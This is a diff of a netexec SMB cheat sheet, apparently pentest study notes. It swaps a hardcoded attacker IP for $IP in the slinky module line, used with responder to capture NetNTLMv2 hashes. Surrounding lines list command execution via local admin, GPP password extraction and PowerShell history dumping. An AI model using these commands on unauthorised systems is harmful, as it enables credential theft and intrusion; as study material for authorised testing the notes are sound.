@@ -32,7 +32,7 @@ netexec smb $IP -u user -p password
 - `-M spider_plus` lists SMB share contents recursively
 - `-X '...'` executes commands using local admin access (useful if WinRM and RDP aren't available)
 - `-M gpp_password`
-- `-M slinky -o NAME=evil SHARE=DocumentsShare SERVER=192.168.45.212`, use with `responder` to capture NetNTLMv2 hashes
+- `-M slinky -o NAME=evil SHARE=DocumentsShare SERVER=$IP`, use with `responder` to capture NetNTLMv2 hashes
 - `-M powershell_history` (requires local admin)
 
 
